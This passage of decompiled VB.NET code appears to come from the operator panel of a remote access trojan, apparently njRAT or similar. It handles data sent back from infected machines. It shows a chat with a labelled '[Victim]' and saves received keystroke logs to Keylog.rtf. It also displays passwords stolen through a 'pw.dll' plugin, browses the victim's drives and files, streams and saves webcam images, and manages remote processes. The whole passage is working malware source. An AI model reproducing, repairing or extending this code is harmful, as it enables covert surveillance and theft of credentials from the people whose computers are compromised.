																					Dim flag74 As Boolean = Operators.CompareString(left5, "!", False) = 0
																					If flag74 Then
																						chat.T2.Enabled = True
																						chat.Button1.Enabled = True
																						Dim obj5 As Chat = chat
																						SyncLock obj5
																							chat.T1.AppendText("Connected .." & vbCrLf)
																						End SyncLock
																					Else
																						Dim flag75 As Boolean = Operators.CompareString(left5, "@", False) <> 0
																						If Not flag75 Then
																							Dim obj6 As Chat = chat
																							SyncLock obj6
																								chat.T1.SelectionStart = chat.T1.TextLength
																								chat.T1.SelectionFont = New Font(chat.T1.Font, FontStyle.Bold)
																								chat.T1.AppendText("[Victim] ")
																								chat.T1.SelectionFont = chat.T1.Font
																								chat.T1.AppendText(Class6.smethod_16(array2(3)) + vbCrLf)
																								chat.T1.SelectionStart = chat.T1.TextLength
																								chat.T1.ScrollToCaret()
																								Try
																									Interaction.AppActivate(chat.Text)
																								Catch ex10 As Exception
																								End Try
																							End SyncLock
																						End If
																					End If
																				End If
																			End If
																		Else
																			Dim flag76 As Boolean = Operators.CompareString(left, "kla", False) = 0
																			If flag76 Then
																				Dim kl As kl = CType(Class7.smethod_3("kl" + client.ip()), kl)
																				Dim obj7 As kl = kl
																				SyncLock obj7
																					kl.T1.Clear()
																					Dim array22 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
																					kl.ProgressBar1.Value = 0
																					kl.ProgressBar1.Maximum = array22.Length
																					For Each t2 As String In array22
																						kl.insert(t2)
																						Dim progressBar3 As ProgressBar = kl.ProgressBar1
																						progressBar3.Value += 1
																					Next
																					kl.T1.ScrollToCaret()
																					kl.ProgressBar1.Value = 0
																					kl.ToolStripMenuItem1.Enabled = True
																					Dim flag77 As Boolean = Not Directory.Exists(client.Folder)
																					If flag77 Then
																						Directory.CreateDirectory(client.Folder)
																					End If
																					kl.T1.SaveFile(client.Folder + "Keylog.rtf")
																				End SyncLock
																			Else
																				Dim flag78 As Boolean = Operators.CompareString(left, "kl", False) = 0
																				If flag78 Then
																					Dim invokeRequired5 As Boolean = Class7.form1_0.InvokeRequired
																					If invokeRequired5 Then
																						Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																					Else
																						Dim flag79 As Boolean = Class7.smethod_3("kl" + client.ip()) Is Nothing
																						If flag79 Then
																							New kl() With { .c = client, .Name = "kl" + client.ip(), .Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(client.L))) }.Show()
																						End If
																						Dim thread As Thread = AddressOf Class7.smethod_5
																						Dim thread2 As Thread = thread
																						Dim array24 As Object() = New Object(1) {}
																						array24(0) = client
																						Dim num23 As Integer = 1
																						Dim text4 As String = "kla" + Class7.string_1 + array2(1)
																						array24(num23) = Class6.smethod_11(text4)
																						thread2.Start(array24)
																					End If
																				Else
																					Dim flag80 As Boolean = Operators.CompareString(left, "ret", False) = 0
																					If flag80 Then
																						Dim invokeRequired6 As Boolean = Class7.form1_0.InvokeRequired
																						If invokeRequired6 Then
																							Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																						Else
																							Dim flag81 As Boolean = Operators.CompareString(array2(1), Class7.smethod_0("pw.dll", Nothing).string_1, False) <> 0
																							If Not flag81 Then
																								Dim pass As Pass = CType(Class7.smethod_3("Pass"), Pass)
																								Dim flag82 As Boolean = pass Is Nothing
																								If flag82 Then
																									pass = New Pass()
																									pass.Show()
																								End If
																								Dim pass2 As Pass = pass
																								Dim client3 As Client = client
																								Dim text5 As String = Class6.smethod_16(array2(2))
																								Dim text6 As String = text5
																								pass2.XD(client3, text6)
																							End If
																						End If
																					Else
																						Dim flag83 As Boolean = Operators.CompareString(left, "inf", False) = 0
																						If flag83 Then
																							Dim flag84 As Boolean = client.L Is Nothing
																							If Not flag84 Then
																								Dim array25 As String() = Strings.Split(Class6.smethod_16(array2(1)), vbCrLf, -1, CompareMethod.Binary)
																								Dim text7 As String = "+++ Server Info"
																								Dim num24 As Integer = 0
																								Dim num25 As Integer = array25.Length - 1
																								For num26 As Integer = num24 To num25
																									text7 = String.Concat(New String() { text7, vbCrLf & "{", Conversions.ToString(num26), "}  ", array25(num26) })
																								Next
																								client.L.Cells(0).ToolTipText = String.Format(text7, New Object() { "Name", "Host", "Dir", "Exe", "Copy", "StartUP F", "StartUp R", "BSOD" })
																							End If
																						Else
																							Dim flag85 As Boolean = Operators.CompareString(left, "FM", False) = 0
																							If flag85 Then
																								Dim manager8 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
																								Dim flag86 As Boolean = manager8 Is Nothing
																								If Not flag86 Then
																									Dim left6 As String = array2(1)
																									Dim flag87 As Boolean = Operators.CompareString(left6, "!", False) = 0
																									If flag87 Then
																										manager8.L1.Items.Clear()
																										Dim num27 As Integer = 0
																										Dim list6 As List(Of ListViewItem) = New List(Of ListViewItem)()
																										Dim num28 As Integer = 2
																										Dim num29 As Integer = array2.Length - 1
																										For num30 As Integer = num28 To num29
																											Dim array26 As String() = Strings.Split(Class6.smethod_16(array2(num30)), "*", -1, CompareMethod.Binary)
																											Dim directoryInfo As DirectoryInfo = New DirectoryInfo(array26(0))
																											Dim listViewItem7 As ListViewItem = New ListViewItem(directoryInfo.Name)
																											listViewItem7.ToolTipText = directoryInfo.FullName
																											listViewItem7.SubItems.Add(array26(1))
																											Dim left7 As String = array26(1)
																											Dim flag88 As Boolean = Operators.CompareString(left7, DriveType.Fixed.ToString(), False) = 0
																											If flag88 Then
																												listViewItem7.ImageIndex = 1
																											Else
																												Dim flag89 As Boolean = Operators.CompareString(left7, DriveType.Removable.ToString(), False) = 0
																												If flag89 Then
																													listViewItem7.ImageIndex = 3
																												Else
																													Dim flag90 As Boolean = Operators.CompareString(left7, DriveType.CDRom.ToString(), False) = 0
																													If flag90 Then
																														listViewItem7.ImageIndex = 2
																													Else
																														Dim flag91 As Boolean = Operators.CompareString(left7, String.Empty, False) = 0
																														If flag91 Then
																															listViewItem7.ImageIndex = 0
																															Select Case num27
																																Case 0
																																	listViewItem7.Text = "Desktop"
																																Case 1
																																	listViewItem7.Text = "MyPictures"
																																Case 2
																																	listViewItem7.Text = "UserProfile"
																																Case 3
																																	listViewItem7.Text = "StartUp"
																															End Select
																															num27 += 1
																															listViewItem7.SubItems(1).Text = "DIR"
																														Else
																															listViewItem7.ImageIndex = If((Operators.CompareString(left7, DriveType.Network.ToString(), False) <> 0), 1, 5)
																														End If
																													End If
																												End If
																											End If
																											list6.Add(listViewItem7)
																											Dim flag92 As Boolean = list6.Count > 10
																											If flag92 Then
																												manager8.L1.Items.AddRange(list6.ToArray())
																												list6.Clear()
																											End If
																										Next
																										Dim flag93 As Boolean = list6.Count > 0
																										If flag93 Then
																											manager8.L1.Items.AddRange(list6.ToArray())
																											list6.Clear()
																										End If
																										manager8.L1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																									Else
																										Dim flag94 As Boolean = Operators.CompareString(left6, "@", False) = 0
																										If flag94 Then
																											Dim pr4 As ToolStripProgressBar = manager8.pr
																											SyncLock pr4
																												Dim flag95 As Boolean = manager8.Cache.Contains(Class6.smethod_16(array2(2)))
																												If flag95 Then
																													manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																												End If
																												Dim gclass2 As Manager.GClass14 = New Manager.GClass14()
																												gclass2.string_0 = Class6.smethod_16(array2(2))
																												manager8.Cache.Add(gclass2, gclass2.string_0, Nothing, Nothing)
																												Dim directoryInfo2 As DirectoryInfo = New DirectoryInfo(Class6.smethod_16(array2(2)))
																												Dim flag96 As Boolean = Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) <> 0
																												If flag96 Then
																													gclass2.list_1.Clear()
																													gclass2.list_0.Clear()
																													Try
																														manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																													Catch ex11 As Exception
																													End Try
																												Else
																													manager8.pr.Value = 0
																													Dim array27 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
																													manager8.pr.Maximum = array27.Length - 1
																													manager8.L2.Items.Clear()
																													Dim flag97 As Boolean = directoryInfo2.Parent IsNot Nothing
																													If flag97 Then
																														Dim listViewItem8 As ListViewItem = manager8.L2.Items.Add("..", "..", 0)
																														listViewItem8.ToolTipText = directoryInfo2.Parent.FullName
																														listViewItem8.SubItems.Add(String.Empty)
																														listViewItem8.SubItems.Add("DIR")
																													End If
																													manager8.vmethod_108.Images.Clear()
																													manager8.vmethod_108.Images.Add(manager8.MG.Images(0))
																													manager8.vmethod_108.Images.Add("*", manager8.MG.Images(4))
																													Dim list7 As List(Of ListViewItem) = New List(Of ListViewItem)()
																													Dim num31 As Integer = 0
																													Dim num32 As Integer = array27.Length - 2
																													Dim num33 As Integer = num31
																													While num33 <= num32
																														Dim flag98 As Boolean = Operators.CompareString(manager8.TextBox1.Text, directoryInfo2.FullName, False) = 0
																														If flag98 Then
																															Dim listViewItem9 As ListViewItem = New ListViewItem(Class6.smethod_16(array27(num33)), 0)
																															Dim listViewItem10 As ListViewItem = listViewItem9
																															listViewItem10.SubItems.Add(String.Empty)
																															listViewItem10.SubItems.Add("DIR")
																															listViewItem10.ToolTipText = directoryInfo2.FullName + listViewItem10.Text
																															gclass2.list_0.Add(listViewItem10.ToolTipText)
																															Dim pr5 As ToolStripProgressBar = manager8.pr
																															pr5.Value += 1
																															list7.Add(listViewItem9)
																															Dim flag99 As Boolean = list7.Count > 20
																															If flag99 Then
																																manager8.L2.Items.AddRange(list7.ToArray())
																																list7.Clear()
																															End If
																															num33 += 1
																														Else
																															gclass2.list_1.Clear()
																															gclass2.list_0.Clear()
																															Try
																																manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																Return
																															Catch ex12 As Exception
																																Return
																															End Try
																														End If
																													End While
																													Dim flag100 As Boolean = list7.Count > 0
																													If flag100 Then
																														manager8.L2.Items.AddRange(list7.ToArray())
																														list7.Clear()
																													End If
																													manager8.TextBox1.BackColor = Color.Gainsboro
																													manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																													client.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "@", Class7.string_1, array2(2) }))
																													manager8.pr.Value = 0
																												End If
																											End SyncLock
																										Else
																											Dim flag101 As Boolean = Operators.CompareString(left6, "#", False) = 0
																											If flag101 Then
																												Dim pr6 As ToolStripProgressBar = manager8.pr
																												SyncLock pr6
																													Dim text8 As String = Class6.smethod_16(array2(2))
																													Dim flag102 As Boolean = Operators.CompareString(manager8.TextBox1.Text, text8, False) <> 0
																													If Not flag102 Then
																														Dim gclass3 As Manager.GClass14 = CType(manager8.Cache(Class6.smethod_16(array2(2))), Manager.GClass14)
																														gclass3.list_1.Clear()
																														manager8.pr.Value = 0
																														Dim array28 As String() = Strings.Split(array2(3), "*", -1, CompareMethod.Binary)
																														manager8.pr.Maximum = array28.Length - 1
																														Dim list8 As List(Of ListViewItem) = New List(Of ListViewItem)()
																														Dim num34 As Integer = 0
																														Dim num35 As Integer = array28.Length - 2
																														Dim num36 As Integer = num34
																														While num36 <= num35
																															Dim array29 As String() = Strings.Split(Class6.smethod_16(array28(num36)), "*", -1, CompareMethod.Binary)
																															Dim flag103 As Boolean = Operators.CompareString(manager8.TextBox1.Text, text8, False) = 0
																															If flag103 Then
																																Dim listViewItem11 As ListViewItem = New ListViewItem(array29(0))
																																Dim listViewItem12 As ListViewItem = listViewItem11
																																Dim fileInfo As FileInfo = New FileInfo(text8 + array29(0))
																																listViewItem12.ToolTipText = fileInfo.FullName
																																listViewItem12.SubItems.Add(Class6.smethod_17(Conversions.ToLong(array29(1))))
																																listViewItem12.Name = listViewItem12.ToolTipText
																																Dim flag104 As Boolean = array29.Length = 2
																																If flag104 Then
																																	Dim flag105 As Boolean = Operators.CompareString(fileInfo.Extension, String.Empty, False) = 0
																																	If flag105 Then
																																		listViewItem12.SubItems.Add(String.Empty)
																																		listViewItem12.ImageKey = "*"
																																	Else
																																		listViewItem12.SubItems.Add(fileInfo.Extension.Replace(".", String.Empty))
																																		Dim flag106 As Boolean = Not manager8.vmethod_108.Images.ContainsKey(fileInfo.Extension)
																																		If flag106 Then
																																			File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
																																			manager8.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
																																			File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
																																			listViewItem12.ImageKey = fileInfo.Extension
																																		Else
																																			listViewItem12.ImageKey = fileInfo.Extension
																																		End If
																																	End If
																																Else
																																	listViewItem12.SubItems.Add(fileInfo.Extension.Remove(0, 1))
																																	Dim flag107 As Boolean = Not manager8.vmethod_108.Images.ContainsKey(listViewItem12.ToolTipText)
																																	If flag107 Then
																																		manager8.vmethod_108.Images.Add(listViewItem12.ToolTipText, Image.FromStream(New MemoryStream(Convert.FromBase64String(array29(2)))))
																																	End If
																																	Dim flag108 As Boolean = Not manager8.Images.Contains("!" + listViewItem12.ToolTipText)
																																	If flag108 Then
																																		manager8.Images.Add(manager8.vmethod_108.Images(listViewItem12.ToolTipText), "!" + listViewItem12.ToolTipText, Nothing, Nothing)
																																	End If
																																	listViewItem12.ImageKey = listViewItem12.ToolTipText
																																End If
																																gclass3.list_1.Add(String.Concat(New String() { listViewItem12.ToolTipText, "*", listViewItem12.SubItems(1).Text, "*", listViewItem12.SubItems(2).Text }))
																																Dim pr7 As ToolStripProgressBar = manager8.pr
																																pr7.Value += 1
																																list8.Add(listViewItem11)
																																Dim flag109 As Boolean = list8.Count > 20
																																If flag109 Then
																																	manager8.L2.Items.AddRange(list8.ToArray())
																																	list8.Clear()
																																End If
																																num36 += 1
																															Else
																																gclass3.list_1.Clear()
																																gclass3.list_0.Clear()
																																Try
																																	manager8.Cache.Remove(Class6.smethod_16(array2(2)))
																																	Return
																																Catch ex13 As Exception
																																	Return
																																End Try
																															End If
																														End While
																														Dim flag110 As Boolean = list8.Count > 0
																														If flag110 Then
																															manager8.L2.Items.AddRange(list8.ToArray())
																															list8.Clear()
																														End If
																														manager8.TextBox1.BackColor = Color.WhiteSmoke
																														manager8.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
																														manager8.pr.Value = 0
																													End If
																												End SyncLock
																											Else
																												Dim flag111 As Boolean = Operators.CompareString(left6, "$", False) = 0
																												If flag111 Then
																													Dim flag112 As Boolean = manager8.Images.Contains(Class6.smethod_16(array2(2)))
																													If flag112 Then
																														manager8.Images.Remove(Class6.smethod_16(array2(2)))
																													End If
																													manager8.Images.Add(Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { 1 }, Nothing), Byte()))), Class6.smethod_16(array2(2)), Nothing, Nothing)
																													Dim flag113 As Boolean = Not manager8.L2.Items.ContainsKey(Class6.smethod_16(array2(2))) OrElse Not manager8.L2.Items(Class6.smethod_16(array2(2))).Selected
																													If Not flag113 Then
																														manager8.p.Image = CType(manager8.Images(Class6.smethod_16(array2(2))), Image)
																														manager8.p.Visible = True
																													End If
																												Else
																													Dim flag114 As Boolean = Operators.CompareString(left6, "%", False) = 0
																													If flag114 Then
																														Dim invokeRequired7 As Boolean = Class7.form1_0.InvokeRequired
																														If invokeRequired7 Then
																															Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																														Else
																															Dim note As Note = New Note()
																															note.FN = Class6.smethod_16(array2(2))
																															note.Text = manager8.Text + " - " + note.FN
																															note.SK = manager8.sk
																															note.TextBox1.Text = Class6.smethod_16(array2(3)).Replace(vbNullChar, String.Empty)
																															note.Show()
																															note.ToolStripMenuItem1.Enabled = False
																														End If
																													Else
																														Dim flag115 As Boolean = Operators.CompareString(left6, "dl", False) = 0
																														If flag115 Then
																															Dim array30 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
																															Try
																																Try
																																	For Each obj8 As Object In manager8.L2.Items
																																		Dim listViewItem13 As ListViewItem = CType(obj8, ListViewItem)
																																		Dim flag116 As Boolean = Operators.CompareString(array30(1), "!", False) = 0
																																		If flag116 Then
																																			Dim flag117 As Boolean = Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array30(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) = 0
																																			If flag117 Then
																																				listViewItem13.Remove()
																																				Exit For
																																			End If
																																		Else
																																			Dim flag118 As Boolean = Operators.CompareString(listViewItem13.Text, New DirectoryInfo(array30(0)).Name, False) = 0 And Operators.CompareString(listViewItem13.SubItems(2).Text, "DIR", False) <> 0
																																			If flag118 Then
																																				listViewItem13.Remove()
																																				Exit For
																																			End If
																																		End If
																																	Next
																																Finally
																																	Dim enumerator7 As IEnumerator
																																	If TypeOf enumerator7 Is IDisposable Then
																																		TryCast(enumerator7, IDisposable).Dispose()
																																	End If
																																End Try
																															Finally
																																Dim enumerator8 As IEnumerator
																																Dim flag119 As Boolean = TypeOf enumerator8 Is IDisposable
																																If flag119 Then
																																	TryCast(enumerator8, IDisposable).Dispose()
																																End If
																															End Try
																														Else
																															Dim flag120 As Boolean = Operators.CompareString(left6, "nm", False) = 0
																															If flag120 Then
																																Dim array31 As String() = Strings.Split(Class6.smethod_16(array2(2)), "*", -1, CompareMethod.Binary)
																																Try
																																	Try
																																		For Each obj9 As Object In manager8.L2.Items
																																			Dim listViewItem14 As ListViewItem = CType(obj9, ListViewItem)
																																			Dim flag121 As Boolean = Operators.CompareString(listViewItem14.ToolTipText, array31(0), False) = 0
																																			If flag121 Then
																																				Dim flag122 As Boolean = Operators.CompareString(array31(2), "*", False) = 0
																																				If flag122 Then
																																					Dim directoryInfo3 As DirectoryInfo = New DirectoryInfo(array31(0))
																																					listViewItem14.Text = array31(1)
																																					listViewItem14.ToolTipText = directoryInfo3.Parent.FullName + "\" + listViewItem14.Text
																																				Else
																																					Dim fileInfo2 As FileInfo = New FileInfo(array31(0))
																																					listViewItem14.Text = array31(1)
																																					listViewItem14.ToolTipText = fileInfo2.Directory.FullName + "\" + listViewItem14.Text
																																					listViewItem14.SubItems(2).Text = New FileInfo(listViewItem14.ToolTipText).Extension.Replace(".", String.Empty)
																																				End If
																																			End If
																																		Next
																																	Finally
																																		Dim enumerator9 As IEnumerator
																																		If TypeOf enumerator9 Is IDisposable Then
																																			TryCast(enumerator9, IDisposable).Dispose()
																																		End If
																																	End Try
																																Finally
																																	Dim enumerator10 As IEnumerator
																																	Dim flag123 As Boolean = TypeOf enumerator10 Is IDisposable
																																	If flag123 Then
																																		TryCast(enumerator10, IDisposable).Dispose()
																																	End If
																																End Try
																															Else
																																Dim flag124 As Boolean = Operators.CompareString(left6, "ER", False) <> 0
																																If Not flag124 Then
																																	manager8.SL.Text = array2(3)
																																	Dim flag125 As Boolean = Not array2(3).StartsWith("UnRAR_")
																																	If Not flag125 Then
																																		Dim pr8 As ToolStripProgressBar = manager8.pr
																																		SyncLock pr8
																																			Dim fileInfo3 As FileInfo = New FileInfo(array2(3))
																																			Dim flag126 As Boolean = Operators.CompareString(fileInfo3.Directory.FullName.ToLower() + "\", manager8.TextBox1.Text.ToLower(), False) <> 0
																																			If Not flag126 Then
																																				Dim listViewItem15 As ListViewItem = manager8.L2.Items.Add(fileInfo3.FullName, fileInfo3.Name, 0)
																																				listViewItem15.SubItems.Add(String.Empty)
																																				listViewItem15.SubItems.Add("DIR")
																																			End If
																																		End SyncLock
																																	End If
																																End If
																															End If
																														End If
																													End If
																												End If
																											End If
																										End If
																									End If
																								End If
																							Else
																								Dim flag127 As Boolean = Operators.CompareString(left, "CAM", False) = 0
																								If flag127 Then
																									Dim flag128 As Boolean = client.osk Is Nothing
																									If flag128 Then
																										client.isPL = True
																										Try
																											client.osk = Class7.sk_0.GetClient(array2(1))
																										Catch ex14 As Exception
																											client.CN = False
																										End Try
																									End If
																									Dim cam As Cam = CType(Class7.smethod_3("cam" + client.ip()), Cam)
																									Dim left8 As String = array2(2)
																									Dim flag129 As Boolean = Operators.CompareString(left8, "~", False) = 0
																									If flag129 Then
																										Dim flag130 As Boolean = cam Is Nothing
																										If flag130 Then
																											Dim invokeRequired8 As Boolean = Class7.form1_0.InvokeRequired
																											If invokeRequired8 Then
																												Class7.form1_0.Invoke(AddressOf Class7.smethod_5, New Object() { RuntimeHelpers.GetObjectValue(object_0) })
																											Else
																												Dim cam2 As Cam = New Cam()
																												cam2.sk = client
																												cam2.osk = client.osk
																												cam2.Name = "cam" + client.ip()
																												Dim num37 As Integer = 3
																												Dim num38 As Integer = array2.Length - 1
																												For num39 As Integer = num37 To num38
																													cam2.ComboBox1.SelectedIndex = cam2.ComboBox1.Items.Add(array2(num39))
																												Next
																												cam2.Show()
																											End If
																										Else
																											Dim num40 As Integer = 3
																											Dim num41 As Integer = array2.Length - 1
																											For num42 As Integer = num40 To num41
																												cam.ComboBox1.SelectedIndex = cam.ComboBox1.Items.Add(array2(num42))
																											Next
																										End If
																									Else
																										Dim flag131 As Boolean = Operators.CompareString(left8, "!", False) = 0
																										If flag131 Then
																											Dim flag132 As Boolean = cam Is Nothing
																											If Not flag132 Then
																												Dim cam3 As Cam = cam
																												cam3.fps += 1
																												cam.pkt = array.Length
																												Thread.Sleep(10)
																												Dim flag133 As Boolean = array2(3).Length = 1
																												If Not flag133 Then
																													Dim image As Image = Image.FromStream(New MemoryStream(CType(NewLateBinding.LateIndexGet(Class6.smethod_9(array, array2(2) + Class7.string_1), New Object() { 1 }, Nothing), Byte())))
																													Dim checked As Boolean = cam.CheckBox3.Checked
																													If checked Then
																														Try
																															image.Save(cam.folder + DateAndTime.Now.ToString("yyMMddhhmmssfff") + ".jpg")
																														Catch ex15 As Exception
																														End Try
																													End If
																													cam.PictureBox1.Image = image
																												End If
																											End If
																										Else
																											Dim flag134 As Boolean = Operators.CompareString(left8, "@", False) <> 0 OrElse cam Is Nothing
																											If Not flag134 Then
																												cam.Button1.Text = "Start"
																											End If
																										End If
																									End If
																								Else
																									Dim flag135 As Boolean = Operators.CompareString(left, "proc", False) = 0
																									If flag135 Then
																										Dim manager9 As Manager = CType(Class7.smethod_3("m" + client.ip()), Manager)
																										Dim flag136 As Boolean = manager9 Is Nothing
																										If Not flag136 Then
																											Dim pr9 As ToolStripProgressBar = manager9.pr
																											SyncLock pr9
																												Dim left9 As String = array2(1)
																												Dim flag137 As Boolean = Operators.CompareString(left9, "pid", False) = 0
																												If flag137 Then
																													manager9.PID = Conversions.ToInteger(array2(2))
																												Else
																													Dim flag138 As Boolean = Operators.CompareString(left9, "!", False) = 0
																													If flag138 Then
																														Dim obj10 As Manager = manager9
																														SyncLock obj10
																															Dim array32 As String() = Strings.Split(array2(2), "[::]", -1, CompareMethod.Binary)
																															Dim flag140 As Boolean
																															Dim flag139 As Boolean = Not Class7.InlineAssignHelper(Of Boolean)(flag140, manager9.LPR.Items.Count = 0)
																															If flag139 Then
																																Try
																																	Try
																																		For Each obj11 As Object In manager9.LPR.Items
																																			Dim listViewItem16 As ListViewItem = CType(obj11, ListViewItem)
																																			Dim flag141 As Boolean = listViewItem16.ForeColor = Color.GreenYellow
																																			If flag141 Then
																																				Try
																																					Try
																																						For Each obj12 As Object In listViewItem16.SubItems
																																							Dim listViewSubItem As ListViewItem.ListViewSubItem = CType(obj12, ListViewItem.ListViewSubItem)
																																							listViewSubItem.ForeColor = manager9.LPR.ForeColor
																																						Next
																																					Finally
																																						Dim enumerator12 As IEnumerator
																																						If TypeOf enumerator12 Is IDisposable Then
																																							TryCast(enumerator12, IDisposable).Dispose()
																																						End If
																																					End Try
																																				Finally
																																					Dim enumerator13 As IEnumerator
																																					Dim flag142 As Boolean = TypeOf enumerator13 Is IDisposable
																																					If flag142 Then
																																						TryCast(enumerator13, IDisposable).Dispose()
																																					End If
																																				End Try
																																			End If
																																		Next
																																	Finally
																																		Dim enumerator11 As IEnumerator
																																		If TypeOf enumerator11 Is IDisposable Then
																																			TryCast(enumerator11, IDisposable).Dispose()
																																		End If
																																	End Try
																																Finally
																																	Dim enumerator14 As IEnumerator
																																	Dim flag143 As Boolean = TypeOf enumerator14 Is IDisposable
																																	If flag143 Then
																																		TryCast(enumerator14, IDisposable).Dispose()
																																	End If
																																End Try
																															End If
																															Dim flag144 As Boolean = array32.Length > 1
																															If flag144 Then
																																manager9.pr.Value = 0
																																manager9.pr.Maximum = array32.Length
																																Dim list9 As List(Of ListViewItem) = New List(Of ListViewItem)()
																																For Each text9 As String In array32
																																	Dim array34 As String() = Strings.Split(text9, "[:]", -1, CompareMethod.Binary)
																																	Dim flag145 As Boolean = Operators.CompareString(text9, String.Empty, False) <> 0
																																	If Not flag145 Then
																																		Exit For
																																	End If
																																	Dim flag146 As Boolean = array34(2).StartsWith("\??\")
																																	If flag146 Then
																																		array34(2) = array34(2).Remove(0, "\??\".Length)
																																	End If
																																	Try
																																		Dim pr10 As ToolStripProgressBar = manager9.pr
																																		pr10.Value += 1
																																	Catch ex16 As Exception
																																	End Try
																																	Dim listViewItem17 As ListViewItem = New ListViewItem(array34(0))
																																	listViewItem17.SubItems.Add(array34(1))
																																	listViewItem17.Name = array34(1)
																																	Dim flag147 As Boolean = array34(2).Contains(":\")
																																	If flag147 Then
																																		listViewItem17.SubItems.Add(New FileInfo(array34(2).Replace("""", String.Empty)).Directory.Name)
																																		listViewItem17.ToolTipText = array34(2).Replace("""", String.Empty)
																																	Else
																																		listViewItem17.SubItems.Add(String.Empty)
																																	End If
																																	Dim text10 As String = " "
																																	listViewItem17.SubItems.Add(array34(3))
																																	Dim flag148 As Boolean = array34(4).StartsWith("""")
																																	If flag148 Then
																																		text10 = """"
																																		array34(4) = array34(4).Remove(0, 1)
																																	End If
																																	Dim flag149 As Boolean = array34(4).Contains(text10)
																																	If flag149 Then
																																		array34(4) = array34(4).Remove(0, Strings.InStr(array34(4), text10, CompareMethod.Binary))
																																		Dim flag150 As Boolean = array34(4).StartsWith(" ")
																																		If flag150 Then
																																			array34(4) = array34(4).Remove(0, 1)
																																		End If
																																		listViewItem17.SubItems.Add(array34(4))
																																	Else
																																		listViewItem17.SubItems.Add(String.Empty)
																																	End If
																																	Dim flag151 As Boolean = Not flag140
																																	If flag151 Then
																																		listViewItem17.ForeColor = Color.GreenYellow
																																	End If
																																	Dim flag152 As Boolean = Conversions.ToInteger(array34(1)) = manager9.PID
																																	If flag152 Then
																																		listViewItem17.ForeColor = Color.Red
																																	End If
																																	list9.Add(listViewItem17)
																																	Dim flag153 As Boolean = list9.Count > 10
																																	If flag153 Then
																																		manager9.LPR.Items.AddRange(list9.ToArray())
																																		list9.Clear()
																																	End If
																																Next
																																Dim flag154 As Boolean = list9.Count > 0
																																If flag154 Then
																																	manager9.LPR.Items.AddRange(list9.ToArray())
																																	list9.Clear()
																																End If
																																Dim prfx As Boolean = manager9.PRFX
																																If prfx Then
																																	manager9.PRFX = False
																																	manager9.LPR.method_3()
																																End If
																																Dim columnHeader_3 As ColumnHeader = manager9.LPR.columnHeader_0
																																Dim flag155 As Boolean = columnHeader_3 Is Nothing
																																If flag155 Then
																																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(0))
																																Else
																																	columnHeader_3.Tag = RuntimeHelpers.GetObjectValue(If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "+", False)), If((Not Operators.ConditionalCompareObjectEqual(RuntimeHelpers.GetObjectValue(columnHeader_3.Tag), "-", False)), "-", "+"), "-"))
																																	manager9.LPR.GClass9_ColumnClick(manager9.LPR, New ColumnClickEventArgs(columnHeader_3.Index))
																																End If
																															End If
																															manager9.PRNXT = True
																														End SyncLock
																													Else
																														Dim flag156 As Boolean = Operators.CompareString(left9, "RM", False) = 0
																														If flag156 Then
																															Dim num44 As Integer = 2
																															Dim num45 As Integer = array2.Length - 1
																															For num46 As Integer = num44 To num45
																																manager9.LPR.Items.RemoveByKey(array2(num46))
																															Next
																														Else
																															Dim flag157 As Boolean = Operators.CompareString(left9, "ER", False) <> 0
																															If Not flag157 Then
																																manager9.SL.Text = array2(2)
																															End If
																														End If
																													End If
																												End If
																											End SyncLock
																										End If
																									Else
																										Dim flag158 As Boolean = Operators.CompareString(left, "lv", False) <> 0
																										If flag158 Then
																											Dim flag159 As Boolean = Operators.CompareString(left, "ll", False) <> 0
																											If flag159 Then
																												Dim flag160 As Boolean = Operators.CompareString(left, "P", False) = 0
																												If flag160 Then
																													Dim flag161 As Boolean = client.L Is Nothing OrElse client.L.Cells.Count <= Class7.int_10
																													If flag161 Then
																														Return
																													End If
																													Dim online As Collection = Class7.form1_0.S.Online
																													SyncLock online
																														Dim dataGridViewCell As DataGridViewCell = client.L.Cells(Class7.int_10)
																														Dim num47 As Integer = Conversions.ToInteger(array2(1))
																														dataGridViewCell.Style.ForeColor = If((num47 <> 999), If((num47 < 500), If((num47 < 250), Color.LimeGreen, Color.LightGreen), Color.GreenYellow), Color.Orange)
																														client.L.Cells(Class7.int_10).Value = array2(1) + "ms"
																														Return
																													End SyncLock
																												End If
																												Dim flag162 As Boolean = Operators.CompareString(left, "bla", False) = 0
																												If flag162 Then
																													client.L.DefaultCellStyle.ForeColor = Class7.form1_0.L1.DefaultCellStyle.ForeColor
																													Return
																												End If
																												Dim flag163 As Boolean = Operators.CompareString(left, "~", False) = 0
																												If flag163 Then
																													client.Send("~")
																													Return
																												End If
																												Dim flag164 As Boolean = Operators.CompareString(left, "MSG", False) = 0
																												If flag164 Then
																													Dim flag165 As Boolean = Not Class7.class8_0.bool_5
